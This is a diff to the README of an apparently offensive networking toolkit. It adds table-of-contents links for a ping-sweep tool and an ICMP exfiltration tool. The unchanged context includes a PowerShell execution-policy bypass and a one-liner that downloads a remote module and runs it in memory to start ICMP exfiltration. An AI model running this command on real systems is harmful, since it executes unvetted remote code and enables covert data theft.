@@ -8,6 +8,9 @@
    * [`3. Tunneling`](#3-tunneling)
    * [`4. Man-In-The-Middle (MITM) Attacks`](#4-man-in-the-middle-mitm-attacks)
 * [`Tools`](#tools)
+   * [`How to Download & Use`](#-how-to-download--use)
+   * [`PSweep`](https://github.com/h0ru/icmp-quickhacks#psweep)
+   * [`ICMP-Exfil`](https://github.com/h0ru/icmp-quickhacks?tab=readme-ov-file#icmp-exfil)
   
 ---
 
@@ -118,3 +121,5 @@ powershell -ep bypass
 iex(iwr https://raw.githubusercontent.com/h0ru/icmp-quickhacks/main/icmp-exfil/icmp-exfil.psm1)
 Invoke-ICMPExfil
 ```
+
+### For more details on how to use the tools, check the [Wiki](https://github.com/h0ru/icmp-quickhacks/wiki/How-to-use%3F)
